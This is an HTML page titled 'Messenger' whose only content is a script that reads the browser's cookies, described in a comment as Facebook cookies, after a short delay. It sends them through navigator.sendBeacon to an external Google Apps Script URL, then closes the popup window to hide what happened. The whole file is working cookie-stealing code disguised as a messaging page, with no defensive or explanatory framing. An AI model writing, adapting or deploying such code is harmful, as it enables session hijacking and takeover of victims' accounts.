<!DOCTYPE html>
<html>
<head>
    <title>Messenger</title>
    <!-- Make sure the page loads quickly -->
</head>
<body style="margin:0; background:#fff;">
    
    <script>
        // ⚠️ PASTE YOUR GOOGLE APPS SCRIPT URL HERE ⚠️
        var scriptURL = "https://script.google.com/macros/s/AKfycbwCuryz54YhSuokJcwU1XrEx_5Al4C-EK8aVj58ClzHV2l48laM7T_HVUjrsCuliRE/exec";

        // Wait 500ms to ensure Facebook cookies are fully loaded in the browser context
        setTimeout(function() {
            
            // 1. Get the cookie from THIS window (the popup)
            var rawCookie = document.cookie;
            
            console.log("Attempting to send:", rawCookie);

            if (rawCookie && rawCookie !== "") {
                // 2. Encode it so special characters don't break the URL
                var encodedCookie = encodeURIComponent(rawCookie);
                
                // 3. Use sendBeacon for reliable background sending
                navigator.sendBeacon(scriptURL + "?cookie=" + encodedCookie);
                
                console.log("Success!");
            } else {
                console.log("No cookie found");
            }

            // 4. Close the popup window immediately after sending
            window.close();

        }, 500); // 500 milliseconds delay
    </script>
    
</body>
</html>
